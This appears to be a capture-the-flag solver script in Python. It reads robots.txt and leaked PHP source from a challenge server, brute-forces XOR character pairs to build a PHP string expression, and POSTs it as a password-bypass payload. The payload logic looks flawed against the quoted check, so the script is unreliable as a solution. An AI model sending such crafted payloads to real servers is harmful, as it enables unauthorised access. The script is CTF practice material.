import requests
session=requests.Session()
url="http://34.76.107.218/catchmeifyoucan/"
import string


#Step1:Checking http://34.76.107.218/catchmeifyoucan/robots.txt we find
"""

User-agent: *
Disallow: /S3cr3t.php
Disallow: /source.php


"""

pages="S3cr3t.php source.php flag.php".split(' ')

check='R_4r3@'

#Step2:Checking the source at 
	#http://34.76.107.218/catchmeifyoucan/source.php

"""

	<?php


	include('flag.php');

	$password=$_POST['pass'];

	if (strpos( $password, 'R_4r3@')!== FALSE){
	    
	    if (!preg_match('/^-?[a-z0-9]+$/m', $password)) {
	    



	        die('ILLEGAL CHARACTERS');
	  
	        }
	echo $cipher;
	    }
	else 
	{
	    echo 'Wrong Password';
	    }

	?>

"""



allchars=string.printable
def search(charset,achieveletter):
	for i in charset:
		for j in charset:
			if (chr(ord(i)^ord(j)) == achieveletter):
				result=(f'("{i}"^"{j}"). = {achieveletter}')
				print(result)
				return result
			else:
				pass
	print('Charset exhausted')


search(allchars,'@')


"""


check='R_4r3@'
("0"^"b").("0"^"o")."4r3".("0"^"p")
"""











# for page in pages:
# 	response=session.get(url+page)
# 	content=response.text
# 	headers=response.headers
# 	print(f'{url+page}\n{headers}\n{content}\n\n')






link=url+"S3cr3t.php"
payload='`("0"^"b").("0"^"o")."4r3".("0"^"p")`'
data={"pass":payload}
print(data)
response=session.post(link,data=data)
content=response.text
headers=response.headers
print(content)
# print(content)
	